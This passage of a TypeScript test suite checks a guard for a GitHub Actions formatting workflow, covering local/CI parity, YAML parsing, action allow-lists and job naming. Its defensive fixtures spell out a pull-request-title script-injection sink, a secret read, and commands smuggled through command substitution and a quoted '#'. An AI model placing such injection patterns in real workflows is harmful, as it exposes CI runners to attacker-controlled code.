        'steps.format_check.outcome',
        'steps.format_check.conclusion',
        '`steps.format_check.outcome`',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  // The reason this rule needs its own scanner: the write-mode guard reads the
  // literal `pnpm format`, so the obvious spelling of the remedy was rejected as a
  // write-mode STEP. A quoted message is data, not a command.
  //
  // Asserted on the REMEDY step, not the checking one: since AC4 became an equality on
  // the checking step's command, `pnpm format:check || { … }` is rejected there for a
  // different reason (it is no longer the one command a developer runs), and since round
  // 13 the install step is an allow-list of toolchain commands. The remedy carries the
  // required literal inside a quoted message, so the rule under test — quoted arguments
  // are DATA — is what decides, and the checking-step spelling is asserted red just below.
  it('does not mistake an echoed remedy for a step that writes files', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        `        run: echo "::error::Not formatted. Run 'pnpm format' locally and commit the result."\n`,
        '        run: echo "Formatting failed. Run pnpm format and commit."\n',
        'the remedy step',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  it('rejects the inline `|| { … }` remedy on the checking step, as a command shape', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '        run: pnpm format:check\n',
        '        run: pnpm format:check || { echo "Formatting failed. Run pnpm format and commit."; exit 1; }\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('one command, two places')
  })

  it('still fails when `pnpm format` is actually RUN rather than quoted', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace('        run: pnpm format:check\n', '        run: pnpm format\n'),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('prettier:fix')
  })

  // A quoted string is only inert if it cannot execute: `$( … )` and backticks
  // inside double quotes DO run. Those quotes stay in scope for the write scan.
  it('still fails on a write hidden in a command substitution inside a quoted message', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '        run: pnpm format:check\n',
        '        run: echo "$(prettier --write .)" && pnpm format:check\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('prettier --write')
  })

  it('does not let a quoted message satisfy the "CI runs format:check" rule', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '        run: pnpm format:check\n',
        '        run: echo "pnpm format:check"\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain(FORMAT_CHECK_SCRIPT)
  })
})

describe('the format workflow runs the same command a developer runs (#413)', () => {
  // AC4. Local/CI parity is the point of the story: a CI-only variant (a flag, a
  // path list, a re-implementation) recreates the divergence it closes.
  it('fails when no step invokes `pnpm format:check`', () => {
    const r = checkFormatWorkflow(WELL_FORMED.replace('run: pnpm format:check', 'run: pnpm lint'))
    expect(r.ok).toBe(false)
    expect(r.message).toContain(FORMAT_CHECK_SCRIPT)
  })

  it('does not accept a step that merely NAMES the script', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace('run: pnpm format:check', 'run: echo format:check'),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain(FORMAT_CHECK_SCRIPT)
  })

  it('accepts `pnpm run format:check`, the one other spelling of the same invocation', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        'run: pnpm format:check',
        'run: pnpm run format:check',
        'the checking command',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  // The checking step's command is an ALLOW-list of two spellings, not "references
  // the script". Every row below still satisfies `referencesScript` — the old rule —
  // and every row makes CI check a strict SUBSET of what the developer's and the
  // hook's whole-repo `pnpm format:check` covers, which is the divergence this story
  // exists to close. `-s` belongs here too: it silences the output, i.e. the list of
  // offending filenames AC1 requires the contributor to read.
  it('fails on any narrowed spelling of the checking command', () => {
    // Two rules cover the table. A spelling `referencesScript` still recognises as an
    // invocation of the script is caught by the equality ("one command, two places");
    // one whose flag takes a SPACE-separated value is not recognised as an invocation
    // at all, so the older "no step RUNS" rule catches it. Both are red, both name the
    // local/CI divergence — the fragment column records which fired, so a later change
    // that moves a row between them is visible rather than silent.
    const narrowed: [string, string][] = [
      ['pnpm --filter=@pair/website format:check', 'one command, two places'],
      ['pnpm -F @pair/website format:check', 'no step RUNS'],
      ['pnpm -C apps/website format:check', 'no step RUNS'],
      ['pnpm -s format:check', 'one command, two places'],
      ['cd apps/website && pnpm format:check', 'one command, two places'],
      ['npm run format:check', 'one command, two places'],
      ['pnpm format:check --ignore-path .prettierignore.ci', 'one command, two places'],
    ]
    for (const [spelling, fragment] of narrowed) {
      const r = checkFormatWorkflow(
        WELL_FORMED.replace('run: pnpm format:check', `run: ${spelling}`),
      )
      expect(r.ok, `${spelling}: ${r.message}`).toBe(false)
      expect(r.message, spelling).toContain(fragment)
      expect(r.message, spelling).toContain('divergence')
    }
  })

  it('fails when the checking step wraps the command in a multi-line block scalar', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '        run: pnpm format:check\n',
        '        run: |\n          set -e\n          pnpm format:check\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('one command, two places')
  })

  // AC6. Check-only holds in CI exactly as it does in the hook (ADL 2026-07-31).
  // Reuses the pre-push guard's offender list rather than a second copy of it.
  it('fails when a step writes instead of checking (`pnpm format`)', () => {
    const r = checkFormatWorkflow(WELL_FORMED.replace('pnpm format:check', 'pnpm format'))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('prettier:fix')
  })

  it('fails on a raw write-mode formatter appended to the check', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace('pnpm format:check', 'pnpm format:check || prettier --write .'),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('prettier --write')
  })

  it('fails on an auto-commit step, so CI can never repair the branch', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '        run: pnpm format:check\n',
        '        run: |\n          pnpm format\n          git commit -am "chore: format"\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('prettier:fix')
  })
})

describe('the format workflow is safe on a fork PR by construction (#413)', () => {
  // AC5. No secret in the job means a fork run is a FULL-STRENGTH run, and there
  // is no credential for PR-authored code to reach.
  it('fails when any step reads a secret', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '      - name: Check formatting',
        '      - name: Check formatting\n        env:\n          TOKEN: ${{ secrets.GITHUB_TOKEN }}',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('secret')
  })

  // The classic script-injection sink: attacker-controlled text (a PR title, a
  // branch name) expanded by the runner INTO the shell before it runs.
  it('fails when an expression is interpolated into a `run:` block', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        'run: pnpm format:check',
        'run: echo "${{ github.event.pull_request.title }}" && pnpm format:check',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('${{')
  })

  it('leaves an expression OUTSIDE a run block alone (the concurrency group)', () => {
    // `group: format-${{ github.ref }}` is not a shell sink — banning it would
    // ban the duplicate-run mitigation this same guard requires.
    expect(checkFormatWorkflow(WELL_FORMED).ok).toBe(true)
  })
})

// YAML has TWO spellings for every mapping, and this guard's block reader only
// understands one of them. `blockUnder` collects the lines indented deeper than a
// key, so a FLOW mapping on the same line yields an EMPTY block — and an empty
// block is read by `listValueOf` as "the key is absent", which for a trigger filter
// means "no filter, therefore every value". Every trigger rule then passes
// vacuously on a workflow whose trigger is exactly as narrow as the rule forbids.
// The complete table below is the decision table for the structural keys this guard
// reads as blocks: each has a flow spelling GitHub honours, and each is rejected
// rather than parsed — a hand-rolled block reader that pretends to understand flow
// style is a second hole, not a fix.
// Rounds 5–6 REJECTED every spelling the hand-rolled line reader could not follow; the
// migration to `yaml@2.8.2` (ADL 2026-09-01, amended 2026-09-03) deletes that whole rule
// family, because the parser resolves those spellings to the same document GitHub runs.
// So the contract inverts: a flow mapping, a JSON step, an anchor, an alias — all legal
// YAML GitHub honours — are READ, and what decides is the SEMANTIC rule on the resolved
// value. Correct workflow, exotic spelling: GREEN. Hole, whatever the spelling: RED, and
// named by its cause.
describe('a flow-style spelling is READ, and the semantic rule decides (#413)', () => {
  // Same document as WELL_FORMED, spelled in flow/JSON style throughout — the spelling
  // the reader used to reject wholesale, on every structural key at once.
  const WELL_FORMED_FLOW = `name: Format
"on": { pull_request: { branches: [main] }, push: { branches: [main] } }
concurrency: { group: "format-\${{ github.ref }}", cancel-in-progress: true }
jobs:
  format:
    {
      runs-on: ubuntu-latest,
      permissions: { contents: read },
      steps:
        [
          { name: Checkout code, uses: actions/checkout@v4 },
          { name: Install pnpm, uses: pnpm/action-setup@v4, with: { version: "10.15.0" } },
          { name: Install dependencies, run: pnpm install },
          { name: Check formatting, id: format_check, run: pnpm format:check },
          {
            name: Explain how to fix it,
            if: "failure() && steps.format_check.outcome == 'failure'",
            run: "echo \\"::error::Not formatted. Run 'pnpm format' locally and commit the result.\\"",
          },
        ],
    }
`

  it('accepts a workflow spelled entirely in flow style', () => {
    const r = checkFormatWorkflow(WELL_FORMED_FLOW)
    expect(r.ok, r.message).toBe(true)
  })

  // Each row is a CORRECT workflow wearing the spelling round 5 rejected by name.
  const legalSpellings: [string, string, string][] = [
    [
      '`on:` itself as a flow mapping',
      'on:\n  pull_request:\n    branches:\n      - main\n  push:\n    branches:\n      - main\n',
      'on: { pull_request: { branches: [main] }, push: { branches: [main] } }\n',
    ],
    [
      '`on:` as a flow SEQUENCE of event names (no filter is a SUPERSET of `main`)',
      'on:\n  pull_request:\n    branches:\n      - main\n  push:\n    branches:\n      - main\n',
      'on: [pull_request, push]\n',
    ],
    [
      '`on:` as a block LIST of event names',
      'on:\n  pull_request:\n    branches:\n      - main\n  push:\n    branches:\n      - main\n',
      'on:\n  - pull_request\n  - push\n',
    ],
    [
      '`pull_request` as a flow mapping',
      '  pull_request:\n    branches:\n      - main\n',
      '  pull_request: { branches: [main] }\n',
    ],
    [
      '`pull_request` as a flow mapping spanning two lines',
      '  pull_request:\n    branches:\n      - main\n',
      '  pull_request: {\n      branches: [main] }\n',
    ],
    [
      '`push` as a flow mapping',
      '  push:\n    branches:\n      - main\n',
      '  push: { branches: [main] }\n',
    ],
    [
      '`concurrency` as a flow mapping',
      'concurrency:\n  group: format-${{ github.ref }}\n  cancel-in-progress: true\n',
      'concurrency: { group: "format-${{ github.ref }}", cancel-in-progress: true }\n',
    ],
    [
      'the checking step as a JSON-spelled sequence item',
      '      - name: Check formatting\n        id: format_check\n        run: pnpm format:check\n',
      '      - { "name": "Check formatting", "id": "format_check", "run": "pnpm format:check" }\n',
    ],
  ]

  for (const [label, block, flow] of legalSpellings) {
    it(`accepts ${label}`, () => {
      const mutated = mutate(WELL_FORMED, block, flow, label)
      const r = checkFormatWorkflow(mutated)
      expect(r.ok, `${label}: ${r.message}`).toBe(true)
    })
  }

  // …and the four holes that spelling used to hide are still RED — each now named by
  // the SEMANTIC rule that owns it, not by its punctuation.
  const flowHoles: [string, string, string, string][] = [
    [
      'a flow `paths-ignore`',
      '  pull_request:\n    branches:\n      - main\n',
      "  pull_request: { branches: [main], paths-ignore: ['**/*.md'] }\n",
      'paths-ignore',
    ],
    [
      'a flow trigger off the base branch',
      '  pull_request:\n    branches:\n      - main\n',
      '  pull_request: { branches: [release] }\n',
      'does not cover `main` (release)',
    ],
    [
      'a flow `types: [closed]`',
      '  pull_request:\n    branches:\n      - main\n',
      '  pull_request: { branches: [main], types: [closed] }\n',
      'dropping opened, synchronize',
    ],
    [
      'a flow `push` off the base branch',
      '  push:\n    branches:\n      - main\n',
      '  push: { branches: [release] }\n',
      'does not cover `main` (release)',
    ],
    [
      'a flow `concurrency.group` that is not keyed on the ref',
      'concurrency:\n  group: format-${{ github.ref }}\n  cancel-in-progress: true\n',
      'concurrency: { group: format, cancel-in-progress: true }\n',
      'github.ref',
    ],
  ]

  for (const [label, block, flow, cause] of flowHoles) {
    it(`still fails on ${label}, naming the cause`, () => {
      const r = checkFormatWorkflow(mutate(WELL_FORMED, block, flow, label))
      expect(r.ok, `${label}: ${r.message}`).toBe(false)
      expect(r.message, label).toContain(cause)
      expect(r.message, label).not.toContain('flow-style')
    })
  }

  // A step is a sequence ITEM. Every non-block spelling of one used to walk past
  // `usesProblems` AND the write-mode scan at once; the parser resolves each to the
  // same mapping, so both rules now see it. Measured `ok=true` on the shipped file
  // before the migration, RED here for the reason the step actually is one.
  describe('a step spelled as a flow or JSON item is read by every step rule', () => {
    const items: [string, string, string][] = [
      [
        'a flow mapping running a formatter',
        '- { name: Fix, run: npx prettier --write . }',
        'prettier --write',
      ],
      ['a flow mapping with no spaces', '- {run: prettier --write .}', 'prettier --write'],
      [
        'the JSON spelling of the same',
        '- { "name": "Fix", "run": "npx prettier --write ." }',
        'prettier --write',
      ],
      ['a flow mapping using a formatting ACTION', '- { uses: creyD/prettier_action@v4 }', 'uses:'],
      [
        'a flow mapping using an auto-commit action',
        '- { uses: stefanzweifel/git-auto-commit-action@v5 }',
        'uses:',
      ],
      [
        'an anchored item whose first key shares the line',
        '- &fixer { run: npx prettier --write . }',
        'prettier --write',
      ],
      [
        'a bare dash, with the node on the NEXT line',
        '-\n        { run: npx prettier --write . }',
        'prettier --write',
      ],
    ]

    for (const [label, item, cause] of items) {
      it(`fails on ${label}`, () => {
        const r = checkFormatWorkflow(
          WELL_FORMED.replace(
            '      - name: Check formatting\n',
            `      ${item}\n      - name: Check formatting\n`,
          ),
        )
        expect(r.ok, `${label}: ${r.message}`).toBe(false)
        expect(r.message, label).toContain(cause)
      })
    }

    // A `steps:` item that is not a mapping carries no step key at all — and GitHub
    // refuses to run the file (probe run 33724280781 on PR #477: zero jobs). Rejected
    // here rather than filtered out silently.
    it('fails on a sequence item that is not a mapping', () => {
      const r = checkFormatWorkflow(
        WELL_FORMED.replace(
          '      - name: Check formatting\n',
          '      - [a, b]\n      - name: Check formatting\n',
        ),
      )
      expect(r.ok, r.message).toBe(false)
      expect(r.message).toContain('not mappings')
    })

    // Over-reach: an extra block-mapping step and a second branch scalar stay green.
    it('leaves a block-mapping step and a scalar list item alone', () => {
      const extraStep = mutate(
        WELL_FORMED,
        '      - name: Check formatting\n',
        '      - name: Enable corepack\n        run: corepack enable\n      - name: Check formatting\n',
        'the checking step',
      )
      expect(checkFormatWorkflow(extraStep).ok, checkFormatWorkflow(extraStep).message).toBe(true)

      const twoBranches = mutate(
        WELL_FORMED,
        '  push:\n    branches:\n      - main\n',
        "  push:\n    branches:\n      - main\n      - 'release'\n",
        'the `push` branch filter',
      )
      expect(checkFormatWorkflow(twoBranches).ok, checkFormatWorkflow(twoBranches).message).toBe(
        true,
      )
    })

    // …and shell text inside a `run:` block scalar is not YAML at all: the parser hands
    // the body over as a string, so a brace expansion, a `[` test or a `*` glob inside a
    // quoted message is shell and never a sequence item or an alias.
    it('does not read a `run:` block scalar body as YAML structure', () => {
      const shell = mutate(
        WELL_FORMED,
        `        run: echo "::error::Not formatted. Run 'pnpm format' locally and commit the result."\n`,
        `        run: |
          echo "::error::Not formatted. Run 'pnpm format' locally and commit the result."
          echo "Lines like - { a,b } and - [ x ] and * are shell here, not YAML."
`,
        'the remedy step',
      )
      expect(checkFormatWorkflow(shell).ok, checkFormatWorkflow(shell).message).toBe(true)
      expect(extractRunBlocks(shell).some(run => run.includes('- { a,b }'))).toBe(true)
    })
  })

  // Over-reach guard: the spellings the guard always read correctly stay green.
  it('leaves the flow spellings the guard does read correctly alone', () => {
    const flowBranches = mutate(
      WELL_FORMED,
      '  pull_request:\n    branches:\n      - main\n',
      '  pull_request:\n    branches: [main]\n',
      'the `pull_request` branch filter',
    )
    expect(checkFormatWorkflow(flowBranches).ok, checkFormatWorkflow(flowBranches).message).toBe(
      true,
    )

    const inlinePermissions = mutate(
      WELL_FORMED,
      '    permissions:\n      contents: read\n',
      '    permissions: { contents: read }\n',
      'the block-style `permissions:`',
    )
    expect(
      checkFormatWorkflow(inlinePermissions).ok,
      checkFormatWorkflow(inlinePermissions).message,
    ).toBe(true)
  })
})

// The parse is the fail-closed boundary the rejection list used to be. `yaml@2.8.2`
// refuses a document it cannot resolve unambiguously, and so does GitHub — measured on
// PR #477: a merge-keyed job (run 33724280781) and an unknown top-level key (run
// 33724281525) each produced a run with ZERO jobs, i.e. "invalid workflow file".
describe('a file the parser refuses is a problem, not a pass (#413)', () => {
  const unparseable: [string, string][] = [
    ['a duplicate key', 'name: Format\nname: Format\n'],
    ['a tab indent', 'on:\n\tpush:\n'],
    ['an alias with no anchor', 'on: *nowhere\n'],
    ['unbalanced flow punctuation', 'on: { push: { branches: [main] }\n'],
  ]

  for (const [label, text] of unparseable) {
    it(`rejects ${label}`, () => {
      const r = checkFormatWorkflow(text)
      expect(r.ok, `${label}: ${r.message}`).toBe(false)
      expect(r.message, label).toContain('not valid YAML')
    })
  }

  it('rejects a document that is not a mapping of workflow keys', () => {
    const r = checkFormatWorkflow('- pull_request\n- push\n')
    expect(r.ok).toBe(false)
    expect(r.message).toContain('mapping of workflow keys')
  })

  it('rejects a merge key, which GitHub refuses to run at all', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        'jobs:\n  format:\n',
        'jobs:\n  base: &base\n    runs-on: ubuntu-latest\n  format:\n    <<: *base\n',
        'the jobs block',
      ),
    )
    expect(r.ok, r.message).toBe(false)
    expect(r.message).toContain('`<<`')
  })
})

// AC6, the `uses:` half. The write-mode scan reads `run:` blocks only, so a step
// that writes through an ACTION was invisible to it. Placed before the checking
// step, a formatting action rewrites the runner's checkout and `pnpm format:check`
// then passes on unformatted code with the `format` context green — and it needs no
// permission at all to do it, because it never pushes.
describe('a step may only use an allow-listed action (#413)', () => {
  const banned = [
    'creyD/prettier_action@v4',
    'stefanzweifel/git-auto-commit-action@v5',
    'EndBug/add-and-commit@v9',
    './.github/actions/format-fixer',
    'docker://alpine:3',
    'Actions/Checkout-Extra@v1',
  ]

  for (const action of banned) {
    it(`fails on \`uses: ${action}\``, () => {
      const r = checkFormatWorkflow(
        WELL_FORMED.replace(
          '      - name: Check formatting\n',
          `      - name: Fix\n        uses: ${action}\n        with:\n          prettier_options: --write .\n      - name: Check formatting\n`,
        ),
      )
      expect(r.ok, `${action}: ${r.message}`).toBe(false)
      expect(r.message).toContain('uses:')
    })
  }

  it('accepts the three actions the workflow needs, at any version and quoted', () => {
    for (const action of [
      'actions/checkout@v4',
      'actions/checkout@v5',
      "'actions/checkout@v4'",
      'actions/checkout@a1b2c3d4e5f6a7b8c9d0a1b2c3d4e5f6a7b8c9d0',
      'ACTIONS/CHECKOUT@v4',
    ]) {
      // One row here IS the shipped spelling, so this mutation is deliberately an
      // identity for it — `mutate` asserts the NEEDLE, not that the text changed.
      const r = checkFormatWorkflow(
        mutate(
          WELL_FORMED,
          'uses: actions/checkout@v4',
          `uses: ${action}`,
          '`uses: actions/checkout@v4`',
        ),
      )
      expect(r.ok, `${action}: ${r.message}`).toBe(true)
    }
  })
})

// `stripComments` cut from the first ` #` to end of line unconditionally. Inside a
// `run:` block scalar — and inside a QUOTED YAML scalar — that `#` may sit inside
// quotes, where neither bash nor YAML treats it as a comment. The truncation was
// documented as "a comment cannot smuggle a banned pattern IN"; it also smuggled a
// real, executing command OUT of the guard's view, which is the direction that costs
// the AC6 ban.
describe('a `#` inside quotes is not a comment (#413)', () => {
  it('sees a write-mode formatter hidden behind a quoted `#`', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '        run: pnpm install\n',
        '        run: |\n          pnpm install\n          echo "note # here"; prettier --write .\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('prettier --write')
  })

  it('sees it behind single quotes too', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '        run: pnpm install\n',
        "        run: |\n          pnpm install\n          echo 'note # here'; prettier --write .\n",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('prettier --write')
  })

  it('still strips a real shell comment inside a block scalar', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        '        run: pnpm install\n',
        '        run: |\n          pnpm install # prettier --write .\n',
        'the install step',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  it('still strips a whole-line YAML comment, so a comment cannot smuggle a command in', () => {
    expect(
      extractRunBlocks('      # - run: pnpm format\n      - run: pnpm format:check\n'),
    ).toEqual(['pnpm format:check'])
  })
})

// The job's display name (its id when `name:` is absent) IS the status context. Nothing
// asserted it, so renaming `format:` to `fmt:` left the guard green while the context way-of-working documents — and that
// AC8 names for branch protection — silently stopped existing. In advisory mode that
// is no signal at all; once protection lists it, a required context that never
// reports leaves every PR pending with no escape hatch
// (github-implementation.md:857).
describe('the job that reports the `format` context is named (#413)', () => {
  it('fails when the job is renamed', () => {
    const r = checkFormatWorkflow(WELL_FORMED.replace('\n  format:\n', '\n  fmt:\n'))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('format')
    expect(r.message).toContain('status context')
  })

  it('fails on a case variant, since the context name is case-sensitive', () => {
    const r = checkFormatWorkflow(WELL_FORMED.replace('\n  format:\n', '\n  Format:\n'))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('status context')
  })

  it('accepts the quoted spelling of the same job id', () => {
    const r = checkFormatWorkflow(
      mutate(WELL_FORMED, '\n  format:\n', "\n  'format':\n", 'the `format:` job header'),
    )
    expect(r.ok, r.message).toBe(true)
  })

  // "Some job is named `format`" is satisfied by a DECOY. Keep `format:` with one
  // `run: echo ok` step, move the real steps into `worker:`, and the `format` context —
  // the one way-of-working documents and AC8 tells branch protection to list — reports
  // SUCCESS after an echo, while the job that actually checks anything publishes a
  // `worker` context nobody requires. Same loss as the plain rename, and worse: the
  // rename goes red, this used to stay green. So the assertion is on the HOST job.
  it('fails on a decoy `format` job while another job runs the check', () => {
    const decoy = WELL_FORMED.replace(
      '\n  format:\n',
      `
  format:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Nothing
        run: echo ok
  worker:
`,
    )
    const r = checkFormatWorkflow(decoy)
    expect(r.ok, r.message).toBe(false)
    expect(r.message).toContain('is `worker`, not `format`')
  })

  // The same shape without the decoy: the host is renamed and no `format` job exists
  // at all. One accurate problem, not the old name-set message.
  it('names the host job when it is renamed and nothing else claims the context', () => {
    const r = checkFormatWorkflow(WELL_FORMED.replace('\n  format:\n', '\n  worker:\n'))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('is `worker`, not `format`')
  })

  // A second job beside a correctly-named host is not the loss — the context still
  // belongs to the job that checks. (Its shell is an allow-listed inert echo: the
  // toolchain allow-list applies to every non-check, non-remedy step in every job.)
  it('accepts an extra job beside a `format` host that runs the check', () => {
    const extra = mutate(
      WELL_FORMED,
      '\n  format:\n',
      `
  notes:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Nothing
        run: echo "ok"
  format:
`,
      'the `format:` job header',
    )
    expect(checkFormatWorkflow(extra).ok, checkFormatWorkflow(extra).message).toBe(true)
  })

  // No job runs the check at all: `stepProblems` owns that cause, and this rule falls
  // back to the name-set assertion so a missing context is still reported.
  it('still reports the missing `format` job when no job runs the check', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace('\n  format:\n', '\n  worker:\n').replace(
        '        run: pnpm format:check\n',
        '        run: echo skip\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('no job is named `format`')
  })

  // GitHub publishes the job's DISPLAY NAME as the check context, not its id. Measured
  // on this repo: version.yml's job id `version` carries `name: Create version commits
  // and tags`, and `gh run view 32579550290 --json jobs` reports the job as `Create
  // version commits and tags`. So one `name:` line renames the `format` context the
  // same way `fmt:` does — rename red, `name:` was green.
  it('fails when the host job carries a `name:` that is not `format`', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  format:\n    runs-on: ubuntu-latest\n',
        '  format:\n    name: Formatting\n    runs-on: ubuntu-latest\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('name: Formatting')
    expect(r.message).toContain('display name')
  })

  it('fails when the host job name is an expression, whatever it evaluates to', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  format:\n    runs-on: ubuntu-latest\n',
        '  format:\n    name: ${{ github.workflow }}\n    runs-on: ubuntu-latest\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('display name')
  })

  // A `name:` equal to the id publishes the same context; nothing is lost.
  it('accepts a `name:` on the host job that spells the same context', () => {
    for (const name of ['name: format', "name: 'format'"]) {
      const r = checkFormatWorkflow(
        mutate(
          WELL_FORMED,
          '  format:\n    runs-on: ubuntu-latest\n',
          `  format:\n    ${name}\n    runs-on: ubuntu-latest\n`,
          'the `format:` job header',
        ),
      )
      expect(r.ok, `${name}: ${r.message}`).toBe(true)
    }
  })

  // A matrix appends its values to the display name: actions/checkout's job id
  // `analyze` with `name: Analyze` and `matrix.language: ['javascript']` is published as
  // `Analyze (javascript)` (run 33304315280). `format` would become `format (20)` and
  // stop existing — every PR pending once protection lists it, with no escape hatch.
  it('fails when the host job carries a `strategy:` (matrix)', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  format:\n    runs-on: ubuntu-latest\n',
        "  format:\n    strategy:\n      matrix:\n        node: ['20']\n    runs-on: ubuntu-latest\n",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('strategy')
    expect(r.message).toContain('format (')
  })

  // `strategy:` without a `matrix:` publishes no suffix today; rejected all the same,
  // fail-closed — a strategy block exists to carry a matrix.
  it('fails on a `strategy:` block without a matrix, fail-closed', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  format:\n    runs-on: ubuntu-latest\n',
        '  format:\n    strategy:\n      fail-fast: false\n    runs-on: ubuntu-latest\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('strategy')
  })

  // The decoy, spelled through the display name: a second job whose `name:` is
  // `format` publishes a SECOND `format` context after an `echo`, beside the real one.
  it('fails when another job takes the `format` display name', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '\n  format:\n',
        `
  notes:
    name: format
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Nothing
        run: echo ok
  format:
`,
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('`notes`')
    expect(r.message).toContain('display name')
  })

  // A step's `name:` sits one level deeper and is not the job's display name.
  it('does not mistake a step `name:` for the job display name', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        '      - name: Check formatting\n',
        '      - name: Formatting\n',
        'the check step name',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })
})

// `steps.<id>` is JOB-LOCAL and populated only for steps that have already run. A
// failure-path step that names it from another job, or from above the checking step,
// carries a condition that is false on every run — so the remedy never fires, and
// AC1's contributor reads a bare filename with the guard reporting the workflow
// well-formed.
describe('a scoped failure-path step must be able to resolve its scope (#413)', () => {
  const REMEDY =
    "      - name: Explain how to fix it\n        if: failure() && steps.format_check.outcome == 'failure'\n        run: echo \"::error::Not formatted. Run 'pnpm format' locally and commit the result.\"\n"

  it('fails when the remedy lives in a second job', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        REMEDY,
        `  explain:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
${REMEDY}`,
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('job-local')
  })

  it('fails when the remedy sits ABOVE the checking step in the same job', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(REMEDY, '').replace(
        '      - name: Check formatting\n',
        `${REMEDY}      - name: Check formatting\n`,
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('has not run yet')
  })

  it('accepts two correctly-placed scoped remedies', () => {
    const r = checkFormatWorkflow(mutate(WELL_FORMED, REMEDY, REMEDY + REMEDY, 'the remedy step'))
    expect(r.ok, r.message).toBe(true)
  })
})

// Naming `steps.<id>.outcome` and COMPARING it are two different things, and only the
// second one scopes anything. `steps.<id>.outcome` holds one of four values — `success`,
// `failure`, `cancelled`, `skipped` — so the reference is a substring of every condition
// that reads it, including the ones that are false exactly when the check fails.
//
// The table below is that value domain, both operators, both operand orders and both
// quote styles. The decisive row is `== 'success'`: a PR carries an unformatted file,
// `Check formatting` fails, `failure()` is true — but `outcome` is `'failure'`, so the
// remedy is SKIPPED on the one run that needed it and the contributor reads
// `--list-different`'s bare filename with prettier's own "--write to fix" hint
// suppressed. That is AC1's exact loss from a one-token edit.
describe('a failure-path scope must resolve on the FAILURE path (#413)', () => {
  const SCOPE = "steps.format_check.outcome == 'failure'"

  const accepted: [string, string][] = [
    ['the shipped spelling', "steps.format_check.outcome == 'failure'"],
    ['`conclusion` instead of `outcome`', "steps.format_check.conclusion == 'failure'"],
    ['double quotes around the value', 'steps.format_check.outcome == "failure"'],
    ['no spaces around the operator', "steps.format_check.outcome=='failure'"],
    ['extra spaces around the operator', "steps.format_check.outcome   ==   'failure'"],
    ['the operands reversed', "'failure' == steps.format_check.outcome"],
    [
      'the whole condition wrapped in an expression',
      "${{ failure() && steps.format_check.outcome == 'failure' }}",
    ],
  ]

  for (const [label, condition] of accepted) {
    it(`accepts ${label}`, () => {
      // The wrapped row already carries its own `failure()`; the others are ANDed onto one.
      const spelled = condition.startsWith('${{') ? condition : `failure() && ${condition}`
      const r = checkFormatWorkflow(
        mutate(WELL_FORMED, `failure() && ${SCOPE}`, spelled, 'the scoped remedy condition'),
      )
      expect(r.ok, `${label}: ${r.message}`).toBe(true)
    })
  }

  // Every other value in the domain, both operators, plus the two shapes that name the
  // context without comparing it at all. Each leaves the reference intact — the whole
  // point: a substring test for `steps.<id>.outcome` reports all of them well-formed.
  const rejected: [string, string, string][] = [
    [
      "== 'success' — false exactly when the check failed, so the remedy never fires on a red check",
